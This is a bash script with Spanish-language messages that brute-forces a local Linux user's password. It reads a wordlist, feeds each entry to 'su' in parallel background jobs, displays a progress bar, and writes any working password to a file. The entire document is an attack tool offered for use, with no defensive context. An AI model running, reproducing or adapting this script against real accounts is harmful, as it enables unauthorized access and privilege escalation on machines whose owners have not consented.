#!/bin/bash

USER=""
WORDLIST=""
SUCCESSFILE="success_password.txt"
MAX_JOBS=4
FOUND=0

trap 'echo -e "\n[!] Cancelado por el usuario."; kill 0; exit 130' SIGINT

usage() {
    echo "Uso: $0 -u usuario -w diccionario"
    exit 1
}

while getopts ":u:w:" opt; do
    case $opt in
        u) USER="$OPTARG" ;;
        w) WORDLIST="$OPTARG" ;;
        \?) echo "Opción inválida: -$OPTARG" >&2; usage ;;
        :) echo "La opción -$OPTARG requiere un argumento." >&2; usage ;;
    esac
done

if [ -z "$USER" ] || [ -z "$WORDLIST" ]; then
    usage
fi

if [ ! -f "$WORDLIST" ]; then
    echo "ERROR: El archivo de diccionario '$WORDLIST' no existe."
    exit 2
fi

TOTAL=$(wc -l < "$WORDLIST")
CURRENT=0

progress_bar() {
    local progress=$1
    local total=$2
    local percent=$(( progress * 100 / total ))
    local filled=$(( percent / 2 ))
    local empty=$(( 50 - filled ))

    bar=$(printf "%0.s#" $(seq 1 $filled))
    spaces=$(printf "%0.s-" $(seq 1 $empty))

    printf "\r[%-50s] %3d%%" "$bar$spaces" "$percent"
}

try_password() {
    local password=$1
    if [ "$FOUND" -eq 1 ]; then
        return
    fi

    echo "$password" | timeout 5 su -c "id" "$USER" 2>/dev/null >/dev/null
    if [ $? -eq 0 ]; then
        echo -e "\n¡Contraseña encontrada!: $password"
        echo "$password" > "$SUCCESSFILE"
        FOUND=1
        kill 0
        exit 0
    fi
}

# Para controlar la concurrencia y contador
while IFS= read -r password || [ -n "$password" ]; do
    while [ $(jobs -r | wc -l) -ge $MAX_JOBS ]; do
        sleep 0.1
    done

    try_password "$password" &

    CURRENT=$((CURRENT + 1))
    progress_bar "$CURRENT" "$TOTAL"
done < "$WORDLIST"

wait

if [ "$FOUND" -eq 0 ]; then
    echo -e "\nNo se encontró la contraseña en el diccionario."
    exit 1
fi
